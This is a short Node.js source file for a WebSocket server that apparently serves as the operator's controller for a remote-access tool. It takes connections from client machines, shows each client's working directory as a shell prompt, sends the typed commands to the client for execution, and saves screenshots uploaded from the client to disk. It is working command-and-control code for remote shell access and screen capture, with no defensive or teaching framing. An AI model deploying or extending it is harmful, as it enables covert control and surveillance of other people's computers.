
const WebSocket = require('ws');
const colors = require('colors');
const prompt = require('prompt');
const detectCharacterEncoding = require('detect-character-encoding');
require('events').EventEmitter.setMaxListeners = 1;
prompt.start();
var workingDir = "";
const wss = new WebSocket.Server({ port: 4422 });

wss.on('connection', function connection(ws) {
	console.log("[".white + "+".blue + "] Connected to client : ".white + ws._socket.remoteAddress.replace("::ffff:","").underline.green + " !");
	ws.on('message', function incoming(message) {
    
    if(message.startsWith("hello")){
    	workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
    	prompt.get([{"description":workingDir.bold.white + ">".white + "# ".bold.red}], function (err, result) {
			ws.send(result.question);
			if(result.question == "screenshot"){
				console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
			}
		});
    }else if(message.startsWith("##finish##")){
 		ws.send("#pwd");
    }
    else if(message.startsWith("##SCREENSHOT##")){
		var base64Data = message.replace("##SCREENSHOT##","").replace(/^data:image\/png;base64,/, "");
		require("fs").writeFile("screenshots/"+Date.now()+".png", base64Data, 'base64', function(err) {});
    }else{
			
		console.log(message.grey);
    }

	});

	ws.on('close', function(reasonCode, description) {
		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
	});

});
